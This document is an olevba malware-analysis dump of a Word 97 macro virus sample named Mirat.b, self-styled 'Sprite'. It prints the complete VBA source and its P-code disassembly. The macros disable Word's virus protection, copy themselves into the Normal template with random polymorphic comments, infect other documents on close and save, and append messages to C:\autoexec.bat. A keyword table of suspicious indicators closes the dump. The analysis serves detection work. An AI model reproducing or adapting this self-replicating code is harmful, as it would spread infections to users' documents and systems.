olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Mirat.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Mirat.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO fUY.bas 
in file: ./Virus.MSWord.Mirat.b - OLE stream: 'Macros/VBA/fUY'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'It's Sprite again..  I love drinking Sprite, do you want some ? 'BD|! 'BD|! 'BD|!
'W97/Spritey '{�u% '{�u% '{�u%
'Galaxynet IRC #VX 'Q‡~L 'Q‡~L 'Q‡~L
Sub AutoOpen() '“ˆ&‘ '“ˆ&‘ '“ˆ&‘
On Error Resume Next 'K^|& 'K^|& 'K^|&
StatusBar = "<< Sprite lives somewhere in your document! Ain't you afraid? >>" 'gXCj 'gXCj 'gXCj
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Sprite") <> "Love" Then 'm?Aƒ 'm?Aƒ 'm?Aƒ
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Sprite") = "Love" '‚f–� '‚f–� '‚f–�
Options.VirusProtection = (2 Xor 2) ';s•= ';s•= ';s•=
Dim wm, sex, gabe '`,—q '`,—q '`,—q
gabe = Chr(Int((100 * Rnd) + 32)) + Chr(Int((100 * Rnd) + 32)) + Chr(Int((100 * Rnd) + 32)) '!e,, '!e,, '!e,,
ActiveDocument.VBProject.VBComponents(2).Name = gabe 'B%C 'B%C 'B%C
wm = ActiveDocument.VBProject.VBComponents.Item(2).CodeModule.CountOfLines 'MD‘• 'MD‘• 'MD‘•
Set myTemplate = NormalTemplate 'PA33 'PA33 'PA33
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=myTemplate.FullName, Name:=gabe, Object:=wdOrganizerObjectProjectItems 'mQQu 'mQQu 'mQQu
For i = 1 To wm 'Gk86 'Gk86 'Gk86
sex = ActiveDocument.VBProject.VBComponents(2).CodeModule.Lines(i, 1) 'f)VŒ 'f)VŒ 'f)VŒ
poly = Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) '?~MB '?~MB '?~MB
strn = sex + " '" + poly 'ŽkkS 'ŽkkS 'ŽkkS
NormalTemplate.VBProject.VBComponents.Item(2).CodeModule.ReplaceLine i, strn '+cs� '+cs� '+cs�
Next i '„"a� '„"a� '„"a�
Documents.Open FileName:=NormalTemplate.FullName, ConfirmConversions:=False, ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:="", PasswordTemplate:="", Revert:=False, WritePasswordDocument:="", WritePasswordTemplate:="", Format:=wdOpenFormatAuto 'Sq\] 'Sq\] 'Sq\]
ActiveDocument.Save 'WJP@ 'WJP@ 'WJP@
ActiveDocument.Close '&=•' '&=•' '&=•'
Open "C:\autoexec.bat" For Append As #1 'NKZ2 'NKZ2 'NKZ2
Print #1, "@echo off" 'X>ka 'X>ka 'X>ka
Print #1, "echo TheOne-Gabe-Yulaw" '2�n\ '2�n\ '2�n\
Print #1, "echo Sprite is living in your system.. do you want to see Sprite? --- Galaxynet IRC #VX" 'N,~W 'N,~W 'N,~W
Print #1, "echo." 'zgƒ" 'zgƒ" 'zgƒ"
Close #1 '9(,G '9(,G '9(,G
End If '/ `n '/ `n '/ `n
End Sub 'aƒ)7 'aƒ)7 'aƒ)7
Sub AutoClose() 'qVJ1 'qVJ1 'qVJ1
On Error Resume Next 't�_* 't�_* 't�_*
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "VX") = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "VX") + 1 'zPW[ 'zPW[ 'zPW[
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "VX") >= 10 Then MsgBox "Sprite, you are very cute boy!! Do you agree??", vbYesNo, "Sprite is gonna spread now !" '8G+f '8G+f '8G+f
Dim gabe, myTemplate '4�+U '4�+U '4�+U
myTemplate = NormalTemplate '@ˆz@ '@ˆz@ '@ˆz@
gabe = NormalTemplate.VBProject.VBComponents(2).Name 'p>*# 'p>*# 'p>*#
For Each aVar In ActiveDocument.Variables 'F~C< 'F~C< 'F~C<
If aVar.Name = "Inf" Then num = aVar.Index 'Y>H% 'Y>H% 'Y>H%
Next aVar 'Y8‡f 'Y8‡f 'Y8‡f
If (num = 0) And (ActiveDocument.FullName <> myTemplate.FullName) Then 'z�Ga 'z�Ga 'z�Ga
ActiveDocument.Variables.Add Name:="Inf" ')lQ“ ')lQ“ ')lQ“
ActiveDocument.Variables("Inf").Value = 1 '-ŽjI '-ŽjI '-ŽjI
Set myTemplate = ActiveDocument.AttachedTemplate '1Y:— '1Y:— '1Y:—
Application.OrganizerCopy Source:=myTemplate.FullName, Destination:=ActiveDocument.FullName, Name:=gabe, Object:=wdOrganizerObjectProjectItems '/#Ia '/#Ia '/#Ia
ActiveDocument.Save 'Ž`P… 'Ž`P… 'Ž`P…
End If 'ƒpv— 'ƒpv— 'ƒpv—
End Sub 'H[Qs 'H[Qs 'H[Qs
Sub AutoSave() '5Ra� '5Ra� '5Ra�
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "VX") = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "VX") + 1 '`S]; '`S]; '`S];
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "VX") >= 10 Then MsgBox "Is Sprite a cute little boy?", vbYesNo, "Sprite is gonna do some speading!" 'jZqŠ 'jZqŠ 'jZqŠ
On Error Resume Next 'LDC2 'LDC2 'LDC2
Dim gabe, myTemplate '_:fK '_:fK '_:fK
myTemplate = NormalTemplate '‰Y6r '‰Y6r '‰Y6r
gabe = NormalTemplate.VBProject.VBComponents(2).Name 'yi}3 'yi}3 'yi}3
For Each aVar In ActiveDocument.Variables '€8’' '€8’' '€8’'
If aVar.Name = "Inf" Then num = aVar.Index ''MW ''MW ''MW
Next aVar '.-4% '.-4% '.-4%
If (num = 0) And (ActiveDocument.FullName <> myTemplate.FullName) Then 'u_c: 'u_c: 'u_c:
ActiveDocument.Variables.Add Name:="Inf" 'XyzO 'XyzO 'XyzO
ActiveDocument.Variables("Inf").Value = 1 'Œy*l 'Œy*l 'Œy*l
Set myTemplate = ActiveDocument.AttachedTemplate 'u!SP 'u!SP 'u!SP
Application.OrganizerCopy Source:=myTemplate.FullName, Destination:=ActiveDocument.FullName, Name:=gabe, Object:=wdOrganizerObjectProjectItems 'A–€s 'A–€s 'A–€s
ActiveDocument.Save 'RxAJ 'RxAJ 'RxAJ
End If 'T‘.m 'T‘.m 'T‘.m
End Sub 'I,6) 'I,6) 'I,6)
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Mirat.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/fUY - 8303 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0051 "It's Sprite again..  I love drinking Sprite, do you want some ? 'BD|! 'BD|! 'BD|!"
' Line #1:
' 	QuoteRem 0x0000 0x001D "W97/Spritey '{�u% '{�u% '{�u%"
' Line #2:
' 	QuoteRem 0x0000 0x0023 "Galaxynet IRC #VX 'Q‡~L 'Q‡~L 'Q‡~L"
' Line #3:
' 	FuncDefn (Sub AutoOpen())
' 	QuoteRem 0x000F 0x0010 "“ˆ&‘ '“ˆ&‘ '“ˆ&‘"
' Line #4:
' 	OnError (Resume Next) 
' 	QuoteRem 0x0015 0x0010 "K^|& 'K^|& 'K^|&"
' Line #5:
' 	LitStr 0x0040 "<< Sprite lives somewhere in your document! Ain't you afraid? >>"
' 	St StatusBar 
' 	QuoteRem 0x004F 0x0010 "gXCj 'gXCj 'gXCj"
' Line #6:
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0006 "Sprite"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0004 "Love"
' 	Ne 
' 	IfBlock 
' 	QuoteRem 0x006C 0x0010 "m?Aƒ 'm?Aƒ 'm?Aƒ"
' Line #7:
' 	LitStr 0x0004 "Love"
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0006 "Sprite"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	QuoteRem 0x0063 0x0010 "‚f–� '‚f–� '‚f–�"
' Line #8:
' 	LitDI2 0x0002 
' 	LitDI2 0x0002 
' 	Xor 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	QuoteRem 0x0024 0x0010 ";s•= ';s•= ';s•="
' Line #9:
' 	Dim 
' 	VarDefn wm
' 	VarDefn sex
' 	VarDefn gabe
' 	QuoteRem 0x0012 0x0010 "`,—q '`,—q '`,—q"
' Line #10:
' 	LitDI2 0x0064 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0020 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0064 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0020 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0020 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St gabe 
' 	QuoteRem 0x005C 0x0010 "!e,, '!e,, '!e,,"
' Line #11:
' 	Ld gabe 
' 	LitDI2 0x0002 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemSt New 
' 	QuoteRem 0x0035 0x0010 "B%C 'B%C 'B%C"
' Line #12:
' 	LitDI2 0x0002 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St wm 
' 	QuoteRem 0x004B 0x0010 "MD‘• 'MD‘• 'MD‘•"
' Line #13:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set myTemplate 
' 	QuoteRem 0x0020 0x0010 "PA33 'PA33 'PA33"
' Line #14:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld myTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld gabe 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' 	QuoteRem 0x008F 0x0010 "mQQu 'mQQu 'mQQu"
' Line #15:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld wm 
' 	For 
' 	QuoteRem 0x0010 0x0010 "Gk86 'Gk86 'Gk86"
' Line #16:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St sex 
' 	QuoteRem 0x0046 0x0010 "f)VŒ 'f)VŒ 'f)VŒ"
' Line #17:
' 	LitDI2 0x0078 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0020 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0078 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0020 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0078 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0020 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0078 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0020 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St poly 
' 	QuoteRem 0x0079 0x0010 "?~MB '?~MB '?~MB"
' Line #18:
' 	Ld sex 
' 	LitStr 0x0002 " '"
' 	Add 
' 	Ld poly 
' 	Add 
' 	St strn 
' 	QuoteRem 0x0019 0x0010 "ŽkkS 'ŽkkS 'ŽkkS"
' Line #19:
' 	Ld i 
' 	Ld strn 
' 	LitDI2 0x0002 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' 	QuoteRem 0x004D 0x0010 "+cs� '+cs� '+cs�"
' Line #20:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x0007 0x0010 "„"a� '„"a� '„"a�"
' Line #21:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordTemplate 
' 	LitVarSpecial (False)
' 	ParamNamed Revert 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePasswordDocument 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePasswordTemplate 
' 	Ld wdOpenFormatAuto 
' 	ParamNamed Format$ 
' 	Ld Documents 
' 	ArgsMemCall Option 0x000A 
' 	QuoteRem 0x0101 0x0010 "Sq\] 'Sq\] 'Sq\]"
' Line #22:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	QuoteRem 0x0014 0x0010 "WJP@ 'WJP@ 'WJP@"
' Line #23:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' 	QuoteRem 0x0015 0x0010 "&=•' '&=•' '&=•'"
' Line #24:
' 	LitStr 0x000F "C:\autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' 	QuoteRem 0x0028 0x0010 "NKZ2 'NKZ2 'NKZ2"
' Line #25:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' 	QuoteRem 0x0016 0x0010 "X>ka 'X>ka 'X>ka"
' Line #26:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "echo TheOne-Gabe-Yulaw"
' 	PrintItemNL 
' 	QuoteRem 0x0023 0x0010 "2�n\ '2�n\ '2�n\"
' Line #27:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0057 "echo Sprite is living in your system.. do you want to see Sprite? --- Galaxynet IRC #VX"
' 	PrintItemNL 
' 	QuoteRem 0x0064 0x0010 "N,~W 'N,~W 'N,~W"
' Line #28:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' 	QuoteRem 0x0012 0x0010 "zgƒ" 'zgƒ" 'zgƒ""
' Line #29:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' 	QuoteRem 0x0009 0x0010 "9(,G '9(,G '9(,G"
' Line #30:
' 	EndIfBlock 
' 	QuoteRem 0x0007 0x0010 "/ `n '/ `n '/ `n"
' Line #31:
' 	EndSub 
' 	QuoteRem 0x0008 0x0010 "aƒ)7 'aƒ)7 'aƒ)7"
' Line #32:
' 	FuncDefn (Sub AutoClose())
' 	QuoteRem 0x0010 0x0010 "qVJ1 'qVJ1 'qVJ1"
' Line #33:
' 	OnError (Resume Next) 
' 	QuoteRem 0x0015 0x0010 "t�_* 't�_* 't�_*"
' Line #34:
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0002 "VX"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0002 "VX"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	QuoteRem 0x00B2 0x0010 "zPW[ 'zPW[ 'zPW["
' Line #35:
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0002 "VX"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitDI2 0x000A 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x002E "Sprite, you are very cute boy!! Do you agree??"
' 	Ld vbYesNo 
' 	LitStr 0x001C "Sprite is gonna spread now !"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' 	QuoteRem 0x00C5 0x0010 "8G+f '8G+f '8G+f"
' Line #36:
' 	Dim 
' 	VarDefn gabe
' 	VarDefn myTemplate
' 	QuoteRem 0x0015 0x0010 "4�+U '4�+U '4�+U"
' Line #37:
' 	Ld NormalTemplate 
' 	St myTemplate 
' 	QuoteRem 0x001C 0x0010 "@ˆz@ '@ˆz@ '@ˆz@"
' Line #38:
' 	LitDI2 0x0002 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St gabe 
' 	QuoteRem 0x0035 0x0010 "p>*# 'p>*# 'p>*#"
' Line #39:
' 	StartForVariable 
' 	Ld aVar 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd Variables 
' 	ForEach 
' 	QuoteRem 0x002A 0x0010 "F~C< 'F~C< 'F~C<"
' Line #40:
' 	Ld aVar 
' 	MemLd New 
' 	LitStr 0x0003 "Inf"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld aVar 
' 	MemLd Index 
' 	St num 
' 	EndIf 
' 	QuoteRem 0x002B 0x0010 "Y>H% 'Y>H% 'Y>H%"
' Line #41:
' 	StartForVariable 
' 	Ld aVar 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x000A 0x0010 "Y8‡f 'Y8‡f 'Y8‡f"
' Line #42:
' 	Ld num 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld myTemplate 
' 	MemLd FullName 
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' 	QuoteRem 0x0047 0x0010 "z�Ga 'z�Ga 'z�Ga"
' Line #43:
' 	LitStr 0x0003 "Inf"
' 	ParamNamed New 
' 	Ld ActiveDocument 
' 	MemLd Variables 
' 	ArgsMemCall Add 0x0001 
' 	QuoteRem 0x0029 0x0010 ")lQ“ ')lQ“ ')lQ“"
' Line #44:
' 	LitDI2 0x0001 
' 	LitStr 0x0003 "Inf"
' 	Ld ActiveDocument 
' 	ArgsMemLd Variables 0x0001 
' 	MemSt Value 
' 	QuoteRem 0x002A 0x0010 "-ŽjI '-ŽjI '-ŽjI"
' Line #45:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	Set myTemplate 
' 	QuoteRem 0x0031 0x0010 "1Y:— '1Y:— '1Y:—"
' Line #46:
' 	Ld myTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld gabe 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' 	QuoteRem 0x008F 0x0010 "/#Ia '/#Ia '/#Ia"
' Line #47:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	QuoteRem 0x0014 0x0010 "Ž`P… 'Ž`P… 'Ž`P…"
' Line #48:
' 	EndIfBlock 
' 	QuoteRem 0x0007 0x0010 "ƒpv— 'ƒpv— 'ƒpv—"
' Line #49:
' 	EndSub 
' 	QuoteRem 0x0008 0x0010 "H[Qs 'H[Qs 'H[Qs"
' Line #50:
' 	FuncDefn (Sub AutoSave())
' 	QuoteRem 0x000F 0x0010 "5Ra� '5Ra� '5Ra�"
' Line #51:
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0002 "VX"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0002 "VX"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	QuoteRem 0x00B2 0x0010 "`S]; '`S]; '`S];"
' Line #52:
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0002 "VX"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitDI2 0x000A 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001C "Is Sprite a cute little boy?"
' 	Ld vbYesNo 
' 	LitStr 0x0021 "Sprite is gonna do some speading!"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' 	QuoteRem 0x00B8 0x0010 "jZqŠ 'jZqŠ 'jZqŠ"
' Line #53:
' 	OnError (Resume Next) 
' 	QuoteRem 0x0015 0x0010 "LDC2 'LDC2 'LDC2"
' Line #54:
' 	Dim 
' 	VarDefn gabe
' 	VarDefn myTemplate
' 	QuoteRem 0x0015 0x0010 "_:fK '_:fK '_:fK"
' Line #55:
' 	Ld NormalTemplate 
' 	St myTemplate 
' 	QuoteRem 0x001C 0x0010 "‰Y6r '‰Y6r '‰Y6r"
' Line #56:
' 	LitDI2 0x0002 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St gabe 
' 	QuoteRem 0x0035 0x0010 "yi}3 'yi}3 'yi}3"
' Line #57:
' 	StartForVariable 
' 	Ld aVar 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd Variables 
' 	ForEach 
' 	QuoteRem 0x002A 0x0010 "€8’' '€8’' '€8’'"
' Line #58:
' 	Ld aVar 
' 	MemLd New 
' 	LitStr 0x0003 "Inf"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld aVar 
' 	MemLd Index 
' 	St num 
' 	EndIf 
' 	QuoteRem 0x002B 0x0010 "'MW ''MW ''MW"
' Line #59:
' 	StartForVariable 
' 	Ld aVar 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x000A 0x0010 ".-4% '.-4% '.-4%"
' Line #60:
' 	Ld num 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld myTemplate 
' 	MemLd FullName 
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' 	QuoteRem 0x0047 0x0010 "u_c: 'u_c: 'u_c:"
' Line #61:
' 	LitStr 0x0003 "Inf"
' 	ParamNamed New 
' 	Ld ActiveDocument 
' 	MemLd Variables 
' 	ArgsMemCall Add 0x0001 
' 	QuoteRem 0x0029 0x0010 "XyzO 'XyzO 'XyzO"
' Line #62:
' 	LitDI2 0x0001 
' 	LitStr 0x0003 "Inf"
' 	Ld ActiveDocument 
' 	ArgsMemLd Variables 0x0001 
' 	MemSt Value 
' 	QuoteRem 0x002A 0x0010 "Œy*l 'Œy*l 'Œy*l"
' Line #63:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	Set myTemplate 
' 	QuoteRem 0x0031 0x0010 "u!SP 'u!SP 'u!SP"
' Line #64:
' 	Ld myTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld gabe 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' 	QuoteRem 0x008F 0x0010 "A–€s 'A–€s 'A–€s"
' Line #65:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	QuoteRem 0x0014 0x0010 "RxAJ 'RxAJ 'RxAJ"
' Line #66:
' 	EndIfBlock 
' 	QuoteRem 0x0007 0x0010 "T‘.m 'T‘.m 'T‘.m"
' Line #67:
' 	EndSub 
' 	QuoteRem 0x0008 0x0010 "I,6) 'I,6) 'I,6)"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

